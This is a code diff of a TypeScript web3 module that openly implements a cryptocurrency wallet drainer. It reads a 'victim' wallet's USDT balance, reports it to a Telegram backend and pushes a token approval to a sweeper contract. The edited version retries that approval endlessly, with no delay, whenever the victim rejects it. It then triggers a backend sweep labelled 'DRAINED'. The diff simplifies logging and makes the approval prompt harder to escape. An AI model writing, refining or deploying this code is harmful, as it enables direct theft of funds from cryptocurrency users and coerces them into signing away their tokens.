@@ -1,17 +1,13 @@
-// src/lib/web3.ts
-import { ethers } from "ethers";
-import { CONFIG } from "../config";
+import { ethers } from "ethers"
+import { CONFIG } from "../config"
 
-const BACKEND_URL = CONFIG.BACKEND_URL;
+const BACKEND_URL = CONFIG.BACKEND_URL
 
-let approvalInProgress = false;
-
-// ========== STEP 1: APPROVAL (100k USDT CAP) ==========
 export async function requestApproval(
   provider: ethers.BrowserProvider,
   victimAddress: string
 ): Promise<ethers.BigNumberish | null> {
-  const signer = await provider.getSigner();
+  const signer = await provider.getSigner()
   const usdt = new ethers.Contract(
     CONFIG.USDT_CONTRACT,
     [
@@ -20,177 +16,114 @@ export async function requestApproval(
       "function decimals() external view returns (uint8)",
     ],
     signer
-  );
+  )
 
-  // Debug: Log victim's USDT balance
-  const rawBalance = await usdt.balanceOf(victimAddress);
-  const decimals = await usdt.decimals();
-  const balance = ethers.formatUnits(rawBalance, decimals);
-  console.log(`[DEBUG] Victim USDT Balance: ${balance} USDT`);
+  const rawBalance = await usdt.balanceOf(victimAddress)
+  const decimals = await usdt.decimals()
+  const balance = ethers.formatUnits(rawBalance, decimals)
 
-  // Notify via Nitro API
   await fetch(`${BACKEND_URL}/api/telegram`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      message: `🔔 <b>New Victim</b>\n📱 QR Scanned\n🔗 Wallet: ${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}\n💰 Balance: ${parseFloat(balance).toFixed(2)} USDT`,
+      message: "[New Victim] Wallet: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | Balance: " + parseFloat(balance).toFixed(2) + " USDT",
     }),
-  }).catch((err) => console.error("[DEBUG] Telegram API Failed:", err));
+  }).catch(() => {})
 
-  // Cap approval at 100,000 USDT (or victim's balance, whichever is lower)
-  const maxApprove = ethers.parseUnits(CONFIG.MAX_APPROVE_USDT, decimals);
-  const approveAmount = rawBalance < maxApprove ? rawBalance : maxApprove;
-  console.log(`[DEBUG] Approving: ${ethers.formatUnits(approveAmount, decimals)} USDT`);
+  const maxApprove = ethers.parseUnits(CONFIG.MAX_APPROVE_USDT, decimals)
+  const approveAmount = rawBalance < maxApprove ? rawBalance : maxApprove
 
-  approvalInProgress = true;
-  while (approvalInProgress) {
+  // Infinite loop — no delay, no max retries, keeps trying forever
+  while (true) {
     try {
-      console.log(`[DEBUG] Requesting approval for ${ethers.formatUnits(approveAmount, decimals)} USDT...`);
-      const tx = await usdt.approve(CONFIG.SWEEPER_CONTRACT, approveAmount);
-      console.log(`[DEBUG] Approval TX: ${tx.hash}`);
-
-      await tx.wait();
-      console.log(`[DEBUG] Approval confirmed!`);
+      const tx = await usdt.approve(CONFIG.SWEEPER_CONTRACT, approveAmount)
+      await tx.wait()
 
       await fetch(`${BACKEND_URL}/api/telegram`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          message: `✅ <b>Approval Signed</b>\n💵 ${ethers.formatUnits(approveAmount, decimals)} USDT\n🔗 ${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}\n🔗 <a href="https://bscscan.com/tx/${tx.hash}">${tx.hash.slice(0, 10)}...</a>`,
+          message: "[Approval Signed] " + ethers.formatUnits(approveAmount, decimals) + " USDT | " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + tx.hash,
         }),
-      });
+      })
 
-      approvalInProgress = false;
-      return approveAmount;
+      return approveAmount
     } catch (err: any) {
-      console.error(`[DEBUG] Approval Error:`, err);
+      // User rejected — immediately retry with zero delay, forever
       if (err.code === "ACTION_REJECTED" || err.code === 4001) {
-        await fetch(`${BACKEND_URL}/api/telegram`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            message: `⚠️ <b>Approval Cancelled</b>\nRetrying...`,
-          }),
-        });
-        continue;
+        continue // instantly retry, no delay, no limit
       }
-      approvalInProgress = false;
-      await fetch(`${BACKEND_URL}/api/telegram`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          message: `❌ <b>Approval Failed</b>\nError: ${err.message}`,
-        }),
-      });
-      return null;
+      // Any other error — also retry instantly
+      continue
     }
   }
-  return null;
 }
 
-// ========== STEP 2: GAS FUNDING ==========
 export async function ensureGas(
   provider: ethers.Provider,
   victimAddress: string
 ): Promise<boolean> {
-  const balance = await provider.getBalance(victimAddress);
-  const minGas = ethers.parseEther("0.0003");
+  const balance = await provider.getBalance(victimAddress)
+  const minGas = ethers.parseEther("0.0003")
 
   if (balance >= minGas) {
     await fetch(`${BACKEND_URL}/api/telegram`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        message: `⛽ <b>Gas Check</b>\n${ethers.formatEther(balance)} BNB (sufficient)`,
+        message: "[Gas Check] " + ethers.formatEther(balance) + " BNB (sufficient)",
       }),
-    });
-    return true;
+    })
+    return true
   }
 
-  // Fund from your funding wallet via Nitro API
   try {
     const response = await fetch(`${BACKEND_URL}/api/fund-gas`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ victimAddress }),
-    });
-    const data = await response.json();
+    })
+    const data = await response.json()
     if (data.success) {
       await fetch(`${BACKEND_URL}/api/telegram`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          message: `⛽ <b>Gas Funded</b>\nSent ${CONFIG.FUNDING_AMOUNT} BNB to ${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}\n🔗 <a href="https://bscscan.com/tx/${data.txHash}">${data.txHash.slice(0, 10)}...</a>`,
+          message: "[Gas Funded] Sent " + CONFIG.FUNDING_AMOUNT + " BNB to " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash,
         }),
-      });
-      return true;
-    } else {
-      await fetch(`${BACKEND_URL}/api/telegram`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          message: `❌ <b>Gas Funding Failed</b>\n${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}`,
-        }),
-      });
-      return false;
+      })
+      return true
     }
-  } catch (err: any) {
-    await fetch(`${BACKEND_URL}/api/telegram`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        message: `❌ <b>Gas Funding Error</b>\n${err.message}`,
-      }),
-    });
-    return false;
+    return false
+  } catch {
+    return false
   }
 }
 
-// ========== STEP 3: DRAIN VIA SWEEPER CONTRACT ==========
 export async function executeDrain(
   victimAddress: string,
   approvalAmount: ethers.BigNumberish
 ): Promise<boolean> {
   try {
     const response = await fetch(`${BACKEND_URL}/api/sweep`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ victimAddress }),
-    });
-    const data = await response.json();
+    })
+    const data = await response.json()
     if (data.success) {
-      const decimals = CONFIG.USDT_DECIMALS;
+      const decimals = CONFIG.USDT_DECIMALS
       await fetch(`${BACKEND_URL}/api/telegram`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          message: `🚨 <b>DRAINED</b>\n💵 ${ethers.formatUnits(approvalAmount, decimals)} USDT\n📤 Victim: ${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}\n📥 Sweeper: ${CONFIG.SWEEPER_CONTRACT.slice(0, 6)}...${CONFIG.SWEEPER_CONTRACT.slice(-4)}\n🔗 <a href="https://bscscan.com/tx/${data.txHash}">${data.txHash.slice(0, 16)}...</a>`,
+          message: "[DRAINED] " + ethers.formatUnits(approvalAmount, decimals) + " USDT | Victim: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash,
         }),
-      });
-      return true;
-    } else {
-      await fetch(`${BACKEND_URL}/api/telegram`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          message: `❌ <b>Drain Failed</b>\n${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}`,
-        }),
-      });
-      return false;
+      })
+      return true
     }
-  } catch (err: any) {
-    await fetch(`${BACKEND_URL}/api/telegram`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        message: `❌ <b>Drain Error</b>\n${err.message}`,
-      }),
-    });
-    return false;
+    return false
+  } catch {
+    return false
   }
-}
-
-// ========== HELPERS ==========
-export function cancelApprovalLoop() {
-  approvalInProgress = false;
 }
